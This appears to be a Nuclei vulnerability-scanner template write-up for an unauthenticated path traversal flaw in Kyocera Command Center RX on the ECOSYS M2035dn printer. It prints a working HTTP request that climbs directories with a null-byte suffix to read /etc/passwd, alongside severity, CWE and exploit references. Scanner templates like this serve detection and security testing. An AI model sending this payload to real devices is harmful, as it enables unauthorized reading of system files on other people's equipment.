# Nuclei Template: Kyocera Command Center RX ECOSYS M2035dn - Local File Inclusion
**Template ID:** kyocera-m2035dn-lfi
**Vulnerability Class:** Path Traversal
**Severity:** High
**CWE:** CWE-22
**Source:** Nuclei Template (`kyocera-m2035dn-lfi.yaml`)

## Vulnerability Information & PoC

## Description
Kyocera Command Center RX ECOSYS M2035dn is vulnerable to unauthenticated local file inclusion.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/js/../../../../../../../../etc/passwd%00.jpg
```

## References
- https://www.exploit-db.com/exploits/50738
- https://www.kyoceradocumentsolutions.com/asia/en/products/business-application/command-center-rx.html
